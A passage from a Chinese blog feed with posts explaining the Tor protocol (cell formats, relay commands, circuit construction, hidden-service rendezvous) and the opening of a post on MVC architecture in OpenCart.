        <content type="html"><![CDATA[<p><img style="margin: auto;" src="/myimages/tor协议理解/index.jpg" height="450" width="450"></p><blockquote><p>在之前的一篇文章中，大致上介绍了客户端通过Tor网络实现匿名访问，以及服务器实现匿名服务的大致过程。在其中忽略了结点之间的连接细节，这篇文章将要针对结点间链路的建立细节展开叙述。<br><a id="more"></a></p><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>Tor匿名协议是建立在tcp连接之上的，在tcp之上运行着TLS传输层加密协议，保证Tor网络的对外加密性。注意到这里的对外加密和匿名性不是一个概念。对外加密是TLS实现，而匿名性则是通过链路机制实现。而链路是靠Cells建立的。所谓的Cells,可以直接理解成为了实现tor的匿名性而特意构建数据包（当然这不算严谨，后面会看到）。在这之中包含了一些标识位，这些标识位中的command字段，是整个网络的灵魂。控制着链路的创建，拓展，销毁；流的建立和应用数据的传输等等。</p><p>这里出现了三个比较容易混淆的概念：连接，链路，流，搞清这三个概念十分重要。连接的建立靠传输层TLS协议，保证了两节点间物理可通，是这一切的基础；而链路是通过Cells机制逐跳拓展的，链路真正实现了匿名性，在Cells中会有一个固定的字段标识一条链路；流是传输在链路之上的应用层数据，用来实现应用的通信，也会在Cells中唯一标识。所以从上到下的依赖关系为：流—-&gt;链路—-&gt;连接。</p></blockquote><h1 id="Cells"><a href="#Cells" class="headerlink" title="Cells"></a>Cells</h1><p>Cell是Tor中通信单元，也可以直接理解为。其本身在tcp/ip协议里面是应用层data部分。然后Tor通过把data也进行了字段的划分，如下图所示，把一些控制字段放在前，真正的数据部分放在payload字段。</p><p><img src="/myimages/tor协议理解/2/cell.jpg" alt="image"></p><p>如图，Tor协议中的数据包有两种，一种是定长Cell,一种是不定长Cell。链路的建立，拓展销毁，数据流的传送主要还是通过定长的Cells；而不定长的Cells主要用在握手协议上。</p><h2 id="数据格式中的CMD"><a href="#数据格式中的CMD" class="headerlink" title="数据格式中的CMD"></a>数据格式中的CMD</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">定长 Cell:</span><br><span class="line"></span><br><span class="line">0--PADDING （ Padding）</span><br><span class="line">1--CREATE （ Create acircuit）</span><br><span class="line">2--CREATED （ Acknowledge create）</span><br><span class="line">3--RELAY （ End-to-end data）</span><br><span class="line">4--DESTROY （ Stop using acircuit）</span><br><span class="line">5--CREATE_FAST（ Create acircuit， no PK）</span><br><span class="line">6--CREATED_FAST （ Circuit created， no PK）</span><br><span class="line">8--NETINFO （ Time andaddress info）</span><br><span class="line">9--RELAY_EARLY （ End-to-end data； limited）</span><br><span class="line">10--CREATE2 （ Extended CREATEcell）</span><br><span class="line">11--CREATED2 （ Extended CREATEDcell）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">不定长Cell:</span><br><span class="line"></span><br><span class="line">7--VERSIONS （ Negotiateprotocol version）</span><br><span class="line">128--VPADDING （ Variable-length padding）</span><br><span class="line">129--CERTS （ Certificates）</span><br><span class="line">130--AUTH_CHALLENGE（ Challenge value）</span><br><span class="line">131--AUTHENTICATE （ Client authenticate）</span><br><span class="line">132--AUTHORIZE （ Client authorization</span><br></pre></td></tr></table></figure><p>以上是Cell中的CMD字段的值，前面的数字是命令代号，也就是直接显示在CMD位上的数值。通过两种Cell的不同命令设计，我们可以比较直观的看到两者的侧重点不一样，定长的Cell控制链路，而不定长的Cell偏向于连接的建立和认证。</p><h2 id="定长Cell与RELAY-Cell"><a href="#定长Cell与RELAY-Cell" class="headerlink" title="定长Cell与RELAY Cell"></a>定长Cell与RELAY Cell</h2><p>由于与匿名通信最直接相关的是定长的Cell，所以接下来我们主要分析定长的Cell的结构和链路控制的细节，从而弥补上一讲我们忽视的链路建立的细节。</p><p><img src="/myimages/tor协议理解/2/fixed_cell.jpg" alt="image"></p><p>定长CELL的固定长度为 512字节，其中链路 ID域占 2字节，数据指令域占1字节，负载占509字节。定长CELL主要用于链路相关操作：建立链路，维护链路，数据传输，断开链路等。另外，定长CELL还根据命令类型的不同分为控制数据Cell和转发数据Cell。其中， 控制数据Cell由洋葱路由器OR负责解释并处理， 转发数据Cell则用来发送端到端的数据（如图可以看到转发数据包的特殊格式）。注意到的是，每一种命令的Cell都会有自己的类似图中RELAY的自定义结构，这里为了解释链路的建立大致过程，抓住主要思想，详细解析RELAY转发Cell的细节，在之后的系列文章中，会逐渐把每种包的结构和细节进行阐述。</p><p>转发数据包头部共 11个字节， 分别为： CMD， 转发指令； Recog， 指定某个洋葱路由器接收的标志位； SID，数据流ID编号； CheckSum，数据流端到端验证用到的校验和； Len，负载中真实数据的长度。整个转发数据包，包括头部和负载， 在Tor网络传输过程中均利用CRT模式下的128-bit AES加密方式进行加密。 数据包延数据链路传递， 被逐跳解密，直到某一跳的洋葱路由器OR成功获得全 0的标志位 Recog，并成功验证数据包的校验和。该洋葱路由器再读取转发数据包头部的具体信息进行相应操作。</p><ul><li>Relay CELL的指令域<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1--RELAY_BEGIN [forward]</span><br><span class="line">2--RELAY_DATA [forward orbackward]</span><br><span class="line">3--RELAY_END [forward orbackward]</span><br><span class="line">4--RELAY_CONNECTED [backward]</span><br><span class="line">5--RELAY_SENDME [forward orbackward][control]</span><br><span class="line">6--RELAY_EXTEND [forward]</span><br><span class="line">7--RELAY_EXTENDED [backward]</span><br><span class="line">8--RELAY_TRUNCATE [forward]</span><br><span class="line">9--RELAY_TRUNCATED [backward]</span><br><span class="line">10 --RELAY_DROP [forward orbackward][control]</span><br><span class="line">11 --RELAY_RESOLVE [forward]</span><br><span class="line">12 --RELAY_RESOLVED [backward]</span><br><span class="line">13 --RELAY_BEGIN_DIR [forward]</span><br><span class="line">14 --RELAY_EXTEND2 [forward][control]</span><br><span class="line">15 --RELAY_EXTENDED2 [backward][control]</span><br><span class="line">32..40 -- 用于Hidden Service的Relay指令第二章 第二代洋葱路</span><br></pre></td></tr></table></figure></li></ul><p>其中， <code>RELAY_BEGIN</code>用于打开一个应用数据流；<code>RELAY_DATA</code>用于传送应用数据；<code>RELAY_END</code>用于彻底关闭一个应用数据流； <code>RELAY_EXTEND和RELAY_EXTENDED</code>用于将链路进行一跳的拓展；<code>RELAY_TRUNCATE和RELAY_TRUNCATED</code>用于将链路进行截断处理，也用于链路错误消息响应；<code>RELAY_SENDME</code>用于流量控制； <code>RELAY_BIGIN_DIR</code>用于开启到目录服务器的数据链路。同时，上述指令中仅被标记为forward的指令只能由链路发起者发送；仅被标记为 backward的指令只能由链路中的结点发送回链路发起者。另外，control标记主要表示该命令是用于链路相关控制，和应用层数据并无关系。</p><h2 id="链路的建立与应用通信"><a href="#链路的建立与应用通信" class="headerlink" title="链路的建立与应用通信"></a>链路的建立与应用通信</h2><p>为了解析链路的建立细节，我们看官方设计文档的一张图：</p><p><img src="/myimages/tor协议理解/2/lianjie.jpg" alt="image"></p><p>Alice是通信的发起者，并希望通过Tor 网络匿名地浏览 Website的内容。Alice的洋葱代理 OP首先选择Tor网络的中间转发结点并与之协商短期会话密钥，从而逐步建立一条通向Website的链路。 而后，当链路建立完成时， OP可以指示链路出口结点开启到 Website的 TCP连接，从而实现Alice与Website之间的匿名通信。具体的通信过程为（忽略了连接建立的过程，按照图中时序进行标号对应）：</p><p>（1）Alice的洋葱代理OP首先发送一个Create命令数据包给它选定的第一个洋葱路由器 OR1（Bob）。其中c1表示Alice与Bob之间的链路 CircID， E(gx1)表示利用Bob洋葱密钥公钥加密的 DH 握手协议的第一部分内容。</p><p>（2）当 Bob接收到Alice发送来的Create命令数据包之后，返回一个对应的 Created 数据包。该数据包中包含：c1，Alice与 Bob之间的链路CircID；DH握手协议的第二<br>部分内容的明文， gy1；临时会话密钥K1（gx1 ⋅y1）的哈希值， H(K1)。一旦链路建立， Alice和Bob就可以发送转发数据包（ Relay Cell），转发数据包的负载部分（ 509B）用其协商好的会话密钥Kl进行加密。</p><p>（3）为了扩展链路，Alice发送一个用 K1加密过的Relay Extend数据包（此数据包为转发数据包）给 Bob，其中包含： c1，Alice与Bob之间的链路 CircID；Relay指令 Extend：下一跳需要拓展到的洋葱路由器（Carol）的地址OR2；利用Carol洋葱密钥公钥加密的 DH握手协议的第一部分内容E(gx2)。</p><p>（4）Bob正确接收到Alice发送来的拓展命令之后，构建一个Create命令数据包。其中，c2表示Bob与Carol之间的链路CircID，E(gx2)是从 Alice处接收到的消息内容，表示利用Carol洋葱密钥公钥加密的DH握手协议的第一部分内容。Carol并不知道 Alice的存在。</p><p>（5）如Bob接收到Create命令数据包时一样，Carol返回一个Created数据包，其中包含：c2，Bob与 Carol之间的链路CircID；DH握手协议的第二部分内容的明文，gy2：临时会话密钥 K2（gx2⋅y2）的哈希值，H(K2)。</p><p>（6）当Bob收到 Carol响应信息后，Bob用他和Alice之间的会话密钥 Kl加密一个Relay Extended数据包（包含gy2和H(K2)），然后将它发回给 Alice。如此，原链路被拓展到了 Carol，且Alice和Carol的会话密钥为 K2。Alice只需重复上述过程，就可将虚电路长度逐步扩展，并最终与目的节点建立连接。一般说来，链路的长度应该为3以上，上图为了解释原理，进行了简化。</p><p>（7）当链路建立完毕后，Alice需要与website实现TCP层面上的握手。这时利用之前建立的链路，发送一个<code>C1：Begin&lt;website&gt;:80</code>命令到Bob。</p><p>（8）Bob经检验是合法的Alice传来的Begin命令后，向链路2转发<code>C2：Begin&lt;website&gt;:80</code>给Carol,然后按照这样的规律层层继续。在最后一个结点(图示中是Carol)负责开启一个TCP连接去获取网站信息。当连接建立完成，最后一个结点会层层回传连接建立成功的包。Carol回传<code>Relay C2{connected}</code>给Bob</p><p>（9）Bob接收到Carol回传的连接建立Cell后，进行转发给Alice，<code>Relay C1{connected}</code></p><p>（10）当Alice接收到连接建立成功的消息后，Alice上层应用的数据就可以通过OP进行分片和利用之前链路建立协商的密钥进行层层加密，如同{ { {Payload} K1} K2 }K3。依次通过链路进行信息通信。</p><h1 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h1><p>这篇文章也是比较大致的阐述了链路建立的相关细节，并且使用的是官方设计文档的图例，这个图例是客户端实现匿名访问明网服务的的过程。理解了这个过程，读者可以发散思维，不难把它类比联想到客户端和匿名服务进行交互的细节。在访问匿名服务的时候，只不过是两端都建立了一条链路，通过约会结点来实现互通，而约会结点的协商则是通过客户端向介绍结点发送约会节点的ip和一次性秘密信息唯一标识一个约会结点并且通过一次性秘密信息来实现约会结点的认证。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://svn.torproject.org/svn/projects/design-paper/tor-design.pdf" target="_blank" rel="noopener">https://svn.torproject.org/svn/projects/design-paper/tor-design.pdf</a></p><p><a href="https://gitweb.torproject.org/torspec.git/tree/tor-spec.txt" target="_blank" rel="noopener">https://gitweb.torproject.org/torspec.git/tree/tor-spec.txt</a></p>]]></content>
      
      
      <categories>
          
          <category> 协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议 </tag>
            
            <tag> 匿名通信 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>tor匿名协议理解一</title>
      <link href="/2018/12/06/tor%E5%8C%BF%E5%90%8D%E5%8D%8F%E8%AE%AE%E7%90%86%E8%A7%A3%E4%B8%80/"/>
      <url>/2018/12/06/tor%E5%8C%BF%E5%90%8D%E5%8D%8F%E8%AE%AE%E7%90%86%E8%A7%A3%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<p><img style="margin: auto;" src="/myimages/tor协议理解/index.jpg" height="450" width="450"></p><blockquote><p>近来对匿名网络的原理比较感兴趣，当然在现在的世界上也有者着一批匿名协议，其中tor的匿名协议可以说是比较成功的，所以打算以tor匿名协议为例，研究匿名通信的相关理论以及实现细节，这篇文章作为一个开篇，记录学习路上的心得。</p></blockquote><a id="more"></a><h1 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h1><blockquote><p>以下对tor协议系统的总结翻译自说明文档</p></blockquote><p>Tor是一个基于TCP的，低延迟的匿名分布式覆盖网络应用集合，比如web浏览器，secure shell,即时通讯等。客户端通过网络建立一个链路，在这个链路中，每一个结点（OR），只知道它的前一个结点和后一个节点，但是不会知晓其他任何结点的相关信息。信息以固定大小的包流通在链路上，每个流过结点都使用对称密钥来解包，就好像一层一层的洋葱一样，然后包依次传递给下一个结点。</p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h3 id="TLS（Transport-Layer-Security）"><a href="#TLS（Transport-Layer-Security）" class="headerlink" title="TLS（Transport Layer Security）"></a>TLS（Transport Layer Security）</h3><p>安全传输层协议（TLS）用于在两个通信应用程序之间提供保密性和数据完整性。TSL是SSL的标准化，也就是访问https网址时候使用的加密协议，在tor协议里面，TSL用来进行每一层的通信加密。</p><p>协议的运行包含有三个阶段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（1） 客户端向服务器端索要并验证公钥。</span><br><span class="line"></span><br><span class="line">（2） 双方协商生成&quot;对话密钥&quot;。</span><br><span class="line"></span><br><span class="line">（3） 双方采用&quot;对话密钥&quot;进行加密通信。</span><br></pre></td></tr></table></figure></p><p>更多的原理细节可以查看：<a href="https://en.wikipedia.org/wiki/Transport_Layer_Security" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Transport_Layer_Security</a></p><h3 id="Diffie-Hellman"><a href="#Diffie-Hellman" class="headerlink" title="Diffie-Hellman"></a>Diffie-Hellman</h3><p>一种确保共享KEY安全穿越不安全网络的方法，也是现在普遍使用密钥交换协议。   </p><p>更多细节请查阅：<a href="https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange</a></p><h3 id="Hash函数"><a href="#Hash函数" class="headerlink" title="Hash函数"></a>Hash函数</h3><p>hash函数是一种将信息散列到固定长度的字符串的技术。</p><p>更多的细节可以查看：<a href="https://en.wikipedia.org/wiki/Hash_function" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Hash_function</a>  </p><h3 id="一致性hash"><a href="#一致性hash" class="headerlink" title="一致性hash"></a>一致性hash</h3><p>更多的细节可以查看：<a href="http://afghl.github.io/2016/07/04/consistent-hashing.html" target="_blank" rel="noopener">http://afghl.github.io/2016/07/04/consistent-hashing.html</a></p><h1 id="基本概念术语"><a href="#基本概念术语" class="headerlink" title="基本概念术语"></a>基本概念术语</h1><p>注意到下面的概念，读者一开始或许比较难以理解，觉得云里雾里。可以大致浏览一下，作为词典来对后面的协议解释中出现的专业名词进行回查。</p><ul><li>OP（OnionProxy）：<br>洋葱代理客户端，可以理解为下载了洋葱路由器的客户端,并且准备通过其进入匿名网络，访问匿名服务器或者通过tor网络来进行网络访问的客户端。需要注意的是客户端不参与路由。</li><li>OR（OnionRouter/Relays）：<br>负责路由的一些中继结点集群。这些是真正的匿名访问实现的主干，是由一批志愿的路由集群组成，现在的路由结点大约在10000个左右。官方文档中所说的Relays,其实与之是同一个概念。</li><li>HS(Hidden Service:):<br>匿名服务器是在洋葱网络里面提供服务的一批服务器，类似于外网中的服务器，只不过它的访问只能通过洋葱网络，并且根据匿名服务协议的规范，可以很好的保护匿名服务器。在外部网络中是不可以访问得到的。这类服务的域名通常由<code>.onion</code>结尾。</li><li>AS（App Server）：<br>在洋葱网络中提供服务的服务器，和现实中的服务器的差别在于其是不需要通过DNS查询，而实基于一套匿名协议 </li><li>标识符（Descriptor）：<br>是一个唯一标识洋葱网络里面的路由（OR）结点（匿名服务器在宏观上也可归结为OR）的信息流，里面有IP，结点状态等基本信息，用来提交给目录权威来更新目录共识。</li><li>目录共识（consensus，下文直接称共识）：<br>共识其实是一个文本，里面根据协议的规范，记录了洋葱网络里面的每一个路由结点的信息，包括一些状态标识，描述符，IP，端口，加密方式等等一系列的基本信息。并且由权威目录共同维护，更新，同步。该文件同步到每个客户端后，通常存放在<code>[洋葱路由器安装目录]\Browser\TorBrowser\Data\Tor\cached-microdesc-consensus</code></li><li>DS/DA（Directo Server/Directory Authority）：<br>目录服务器，官方文档中也习惯性将之目录权威。是整个tor协议的指挥官，一般数目为10个左右，他们之间是一个分布式的共识系统，存储着整个洋葱网络路由结点的基本信息（有时也称为共识），每个洋葱路由结点都需要基于一定的时间向目录权威提交标识符来进行状态更新，同步和维护。目录权威里面还保存着一个长期使用的私钥，用来对证书进行签发。这个私钥是区别于洋葱路由的私钥的（这个细节是在版本2后修改的，过去目录权威的私钥和其作为OR时候的私钥是同一个）。权威目录在整个tor匿名服务不会改变，并且被直接硬编码到二进制文件，相关记录在源码里的<code>\src\or\auth_dirs.inc</code></li><li>出口结点（Exit relay）：<br>在tor的路由协议中，客户端（OP）想要访问实体网络，假设是<code>www.baidu.com</code>,那么它首先需要建立三跳的客户端匿名协议，然后在最后一个路由结点就称为出口节点，用来访问tor网络外部的服务器（<code>www.baidu.com</code>）</li><li>非出口结点（No-exit relay）:<br>只在洋葱网络里面进行收发的不与外界网络相连的结点。可以和出口节点进行对比理解。</li><li>入口结点（Entry relay）：<br>在客户端三跳实例中的第一个入口结点，是OP连入洋葱网络的第一个结点。通常是由守卫结点（Guard relay）和桥（Bridge）来扮演。</li><li>桥（Bridge）：<br>桥是一批不出现在洋葱共识文件里面的结点，他们的存在是为了绕过一些国家或地区对tor的封锁，可以大致理解为一个代理，这些代理拥有连入tor网络的能力，但是不被记录在共识文件里面。</li><li>守卫结点（Guard relay）:  由OP选定的长期使用的作为第一个网络接入点的路由结点（OR），可以看成是一批特殊的OR，其目的就是为了降低一些可能的攻击带来的危害，在后面的针对Tor协议的常见攻击一节将会进行比较细致的讲解。</li><li>约会结点（Rendezvous point）：<br>约会结点是在客户端连接tor匿名服务器的时候指定的交汇路由节点，用来连接介绍结点和客户端三跳路由结点。</li><li>目录缓存（Directory cache relays）:<br>一些带宽比较大的路由节点，可以作为目录权威的缓存结点，提供给客户端获取共识文件，缓解权威目录的负载压力。而其本身的共识文件是根据目录权威来更新同步，然后权威通过分布式容错共识算法达成一致。所以权威目录具有这个洋葱网络路由记录（共识）的最终决定权。</li><li>可靠的目录镜像（ Fallback directory mirror）：<br>这是个硬编码的初始目录列表，在源码的<code>\src\or\fallback_dirs.inc</code>进行记录。编译后就直接硬编码到二进制文件里，用来进行第一次共识的同步和更新。</li><li>链路（Circuit）：<br>链路是在TLS连接建立的基础上，通过tor协议，一系列的cell的传输，通过其携带的一系列Create地Extend包等来构成一条通信链路。然后应用程序，这里专指web可以通过这条链路建立不同的通信流。从而完成通信。</li></ul><h1 id="客户端匿名访问协议和服务隐藏协议"><a href="#客户端匿名访问协议和服务隐藏协议" class="headerlink" title="客户端匿名访问协议和服务隐藏协议"></a>客户端匿名访问协议和服务隐藏协议</h1><h3 id="客户端匿名访问协议"><a href="#客户端匿名访问协议" class="headerlink" title="客户端匿名访问协议"></a>客户端匿名访问协议</h3><p>所谓的匿名访问协议指的是保护访问者的身份的一个Tor协议，它的实现是在已经建立的TLS链接的基础上，通过依次与OR进行DF密钥协商，然后使用交换后的加密密钥来进行上层应用的通信。因为协商密钥的过程是OP与OR依次按照顺序进行的，所以每个OR结点都只能知晓和自己相连的前一个和后一个节点，这样就可以起到很好的客户端匿名访问的功能。</p><blockquote><p>以下图例来自官网，文字借鉴参考官方文档和硕士论文：《基于Tor的反向匿名信道建立技术研究》<br><img src="/myimages/tor协议理解/htw1.jpg" alt="image">  </p></blockquote><p>Alice为使用洋葱代理OP的用户； Dave为目录服务器； Jane和 Bob为应用服务器（例如， Web服务器）；其他主机为互联网中的主机；而带绿色十字标志的为Tor网络中的结点，也就是洋葱路由器OR。此处以 Alice通过Tor网络进行应用服务器的访问为例，简单介绍Tor的主要工作过程。Alice在使用 Tor之前， 首先需要在其主机上安装洋葱代理OP并运行， 并将浏<br>览器或其他需要使用匿名通信服务的应用程序的代理设置为本地 OP所监听的地址与端口。之后， Alice可以按照常规方式使用应用程序而无需做任何其他 Tor相关的操作。被启动之后， OP利用连通的Tor网络透明地执行以下过程：<br>（1） OP尝试连接目录服务器，以获取Tor网络的结点信息；<br>（2）当最新的 Tor网络结点列表被成功下载之后， OP可以根据自身默认的配置以及用户的配置进行Tor结点的选择，从而建立如下图所示的数据链路： </p><p><img src="/myimages/tor协议理解/htw2.png" alt="image"></p><p>得注意的是，在链路建立的过程中，每次只拓展一个链路结点（关于建立连接和拓展的过程我们将在下一篇中进行细致的讲解）。并且， OP与链路上的每一个结点都会协商一组独立的对称密钥。这样，确保了每一跳在传送数据包时都无法被跟踪，也就是说，链路上的每一个结点只知道其前序结点和后继结点，而不会知道整条完整的链路。图2.2中，从Alice开始，绿色连接线的部分说明 Alice通过三次链路拓展形成一条完整的链路，并且链路是经过加密的。链路的出口结点利用非加密的方式连接到了应用服务器Bob。<br>（3）一旦通信链路建立完成，各种类型的数据均可以进行交换，或者说各种不同类型的应用程序都可以利用 OP作为代理而是用Tor提供的匿名通信服务。当前， Tor仅支持 TCP数据流，并能够被支持SOCKS的任何应用程序所使用。     </p><p>（4）为了提高效率和安全性， OP对数分钟内的连接请求均使用同一条链路，而之后的针对不同应用服务的连接请求又将被关联到新的链路，从而来防止攻击者将用户旧的行为和新的行为联系在一起。 如图2.3所示， 当用户需要请求新的应用服务之时，OP建立新的链路为用户应用请求服务。</p><p><img src="/myimages/tor协议理解/htw3.png" alt="image">  </p><p>以上就是客户端选择路由结点并且进行横向拓展的大致过程，但是其中很多的细节我们没有进行很深入的阐述，特别是连接的建立和多路复用的概念等，我们将在下一节中进行探究。</p><h3 id="服务端隐藏协议"><a href="#服务端隐藏协议" class="headerlink" title="服务端隐藏协议"></a>服务端隐藏协议</h3><p>在之前的讨论中，可以看到在Tor的协议中，客户端的匿名是可以得到保证的，那么在实际应用中，光光保护客户端的匿名性是不够的。服务端的匿名性也需要得到体现，所以服务端隐藏协议的目标是为想要对外提供服务的Tor服务器隐藏其具体位置。而这个功能的体现在tor协议中是通过介绍结点和约会结点来直接体现的。以下是具体的服务端身份匿名。</p><p>（1）Tor用户为了能够匿名地对外提供服务， 需要对Tor网络声明其存在。于是，在正式提供服务之前， Tor用户需要随机选取Tor 网络内的几个中继结点，建立到这些结点的链路，并通过告知这些结点该用户的服务公钥的方式来请求结点作为其介绍结点（ Introduction Point ）。</p><p><img src="/myimages/tor协议理解/ser1.png" alt="image"></p><p>如图所示，提供匿名服务的 Tor用户Bob建立到IP1， IP2， IP3的三条链路， 并请求他们成为匿名服务的介绍结点。 而IP1， IP2， IP3三者只知道服务相关的公钥，并不知道提供服务的 Bob的IP地址或身份。</p><p>（2）如图 2.9所示， Bob为其特定的匿名服务生成一个匿名服务描述符。该描述符之中包括服务对应的公钥，服务介绍结点列表，以及利用服务私钥对该描述符前述部分的签名。匿名服务描述符在生成成功之后，被上传到分布式哈希表以供其他 Tor用户查找。查找索引为“ XYZ.onion” ，其中 XYZ为由匿名服务公钥生成而来的服务名， 包括 16个英文字母。 在该步完成之后， 匿名服务已被成功设置，并等待提供服务。</p><p><img src="/myimages/tor协议理解/ser2.png" alt="image"></p><p>（3）当一个Tor用户想要请求匿名服务时， 需要先利用其他途径获得该匿名服务对应的洋葱地址， 即前述的“ XYZ.onion”。 得到洋葱地址之后， 该用户通过询问分布式哈希表来获得匿名服务描述符。若该描述符存在，则通过描述符，用户即可得知匿名服务的介绍结点列表以及所使用的公钥信息。在此期间，用户建立一条链路到一个随机挑选的中继结点，并通过告知该结点一个一次性秘密信息来请求其作为该用户的约会结点（ rendezvous point）。</p><p><img src="/myimages/tor协议理解/ser3.png" alt="image"></p><p>（4）当匿名服务描述符下载完毕， 约会结点也成功设置之后， 请求匿名服务的 Tor用户构造一个由匿名服务公钥加密的消息。该消息的内容为约会结点的地址，以及先前预先协商完成的一次性秘密信息。该消息将通过 Tor链路被发送至匿名服务的某一个介绍结点， 而介绍结点则会将该消息回传给匿名服务提供者。如图2.11所示，匿名服务的提供方Bob与请求方Alice均通过Tor链路来进行数据通信，双方的身份信息都不会被泄露，从而保证了双方的安全性。<br><img src="/myimages/tor协议理解/ser4.png" alt="image"></p><p>（5）匿名服务提供者 Bob获得匿名服务用户Alice发送来的加密的服务相关消息之后，进行解密，并获得其中的约会结点地址及一次性秘密信息。而后，Bob建立一条链路以连接到约会结点， 并向其发送接收到的一次性秘密信息。整个过程如图</p><p><img src="/myimages/tor协议理解/ser5.png" alt="image"></p><p>（7）约会结点将已连接到匿名服务提供者Bob的消息告知匿名服务请求者Alice。在 Alice接收到该消息之后，其便可以利用通过约会结点建立起来的链路进行类似于常规Tor网络通信的正常通信。对于 Bob而言，也是类似的。主要的差别在于， Alice与Bob之间建立的链路是特殊链路，该链路在通常情况下由6个结点组成。在链路之中的约会结点很明了地知道自身的身份：约会结点。</p><p><img src="/myimages/tor协议理解/ser6.png" alt="image"></p><p>整个HiddenService协议的运行过程之中，协议力求保证通信双方的匿名性。协议中所选用的IP1， IP2， IP3，以及RP均无法确切得知通信双方的身份及地理位置， 匿名性由Tor链路的特性（ 单个路由无法得知整条链路） 提供保障。 最终通信双方生成的链路为一条长链路， 通常情况下为6跳。 链路的长度是普通链路的2倍，一定程度上降低了传输效率，这就是使用Tor浏览器的时候会普遍比较卡顿的原因。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="http://www.ruanyifeng.com/blog/2014/02/ssl_tls.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2014/02/ssl_tls.html</a><br><a href="https://gitweb.torproject.org/torspec.git/tree/" target="_blank" rel="noopener">https://gitweb.torproject.org/torspec.git/tree/</a><br><a href="https://svn.torproject.org/svn/projects/design-paper/tor-design.pdf" target="_blank" rel="noopener">PDF: tor-design.pdf</a><br><a href="https://www.torproject.org/projects/torbrowser/design/" target="_blank" rel="noopener">https://www.torproject.org/projects/torbrowser/design/</a><br><a href="https://www.freehaven.net/anonbib/topic.html#Anonymous_20communication" target="_blank" rel="noopener">https://www.freehaven.net/anonbib/topic.html#Anonymous_20communication</a>    </p>]]></content>
      
      
      <categories>
          
          <category> 协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议 </tag>
            
            <tag> 匿名通信 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>基于opencert的MVC架构理解</title>
      <link href="/2018/12/06/%E5%9F%BA%E4%BA%8Eopencert%E7%9A%84MVC%E6%9E%B6%E6%9E%84%E7%90%86%E8%A7%A3/"/>
      <url>/2018/12/06/%E5%9F%BA%E4%BA%8Eopencert%E7%9A%84MVC%E6%9E%B6%E6%9E%84%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p><img style="margin: auto;" src="/myimages/MVC/index.jpg" height="450" width="450"></p><blockquote><p>在学习了一些比较基础的web开发知识和经理一些实践之后，逐渐发觉web框架的重要性，好的框架是可以带来很大的便利的，也能够使得自己的应用变得更加的健壮。同时学习框架也使得自己在大局掌控上跟进一个台阶，同时也可以更贴近web服务的开发现状，不论是对以后的开发或者是安全审计都可以有很大的促进。在框架领域，MVC的概念是不得不深入学习的，它不只是一种技术架构，更是一种编程思想，开发思想。本文将从opencart的实例出发去学习MVC的架构思想，现总结如下：<br><a id="more"></a></p><h1 id="MVC三层架构含义"><a href="#MVC三层架构含义" class="headerlink" title="MVC三层架构含义"></a>MVC三层架构含义</h1><p>MVC框架的作用在于分层解耦，让层与层之间的联系变得不那么紧密，同时可以很大程度的提高并行开发效率，以及更高的代码重用和方便的代码维护。</p><h3 id="Model："><a href="#Model：" class="headerlink" title="Model："></a>Model：</h3><p>模型用于表示底层数据模型结构，可能会被不同的应用程序共享，一个模型应该遵循以下的原则：<br>（1）包含属性用于描述特定的数据<br>（2）应该包含业务逻辑，以确保数据能够满足表现的需要<br>（3）应该包含数据操作的逻辑，如数据的增删改等<br>（4）不应使用$_GET $POST这样的数据，是基于model的功能和重用的考虑<br>（5）不应出现Html代码，不属于model层的范畴</p><h3 id="View："><a href="#View：" class="headerlink" title="View："></a>View：</h3><p>View层（视图）主要用于前端的表现：<br>（1）包含Html，以及所有负责表现的代码，可以出现php，但只是用于遍历数据<br>（2）不应该包含Db请求，数据库的操作<br>（3）不应该出现引用$_GET $_POST这类数组的代码，View只专注于表现<br>（4）如果必要，可以访问Model和Controller的属性，不过仅为了满足表现的需要</p><h3 id="Controller："><a href="#Controller：" class="headerlink" title="Controller："></a>Controller：</h3><p>控制器直接负责用户的请求，对Model的调用即对View表现的控制：<br>（1）可以访问$_GET  $_POST 